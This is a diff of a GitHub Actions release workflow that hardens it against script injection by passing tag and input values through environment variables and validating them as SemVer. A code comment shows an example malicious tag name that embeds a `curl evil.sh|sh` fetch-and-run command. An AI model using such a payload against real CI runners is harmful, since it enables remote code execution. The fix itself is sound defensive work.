@@ -36,11 +36,24 @@ jobs:
         with:
           node-version: 22
 
+      # The tag name and the dispatch input are attacker-controllable text, so
+      # they reach the shell as env vars rather than being interpolated into it:
+      # a `${{ }}` is substituted before the shell runs, and a tag named
+      # `v1.0.0$(curl evil.sh|sh)` would execute on the runner.
+      #
+      # The value is then validated against a strict SemVer shape — anything
+      # else stops the workflow instead of flowing into later steps.
       - name: Resolve released version
         id: released
+        env:
+          RAW_VERSION: ${{ github.event.inputs.version || github.ref_name }}
         run: |
-          RAW="${{ github.event.inputs.version || github.ref_name }}"
-          echo "version=${RAW#v}" >> "$GITHUB_OUTPUT"
+          VERSION="${RAW_VERSION#v}"
+          if ! printf '%s' "$VERSION" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+            echo "Version « $VERSION » non conforme (attendu vX.Y.Z)." >&2
+            exit 1
+          fi
+          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
 
       # The released CHANGELOG section lives only on `main`; take that file
       # wholesale rather than replaying the edit — it is the published text.
@@ -51,7 +64,9 @@ jobs:
 
       - name: Move the dev line to the next -beta
         id: bump
-        run: echo "next=$(node scripts/bump-beta-version.mjs '${{ steps.released.outputs.version }}')" >> "$GITHUB_OUTPUT"
+        env:
+          RELEASED: ${{ steps.released.outputs.version }}
+        run: echo "next=$(node scripts/bump-beta-version.mjs "$RELEASED")" >> "$GITHUB_OUTPUT"
 
       - name: Verify the result holds the invariant
         run: node scripts/check-version-consistency.mjs --against-main
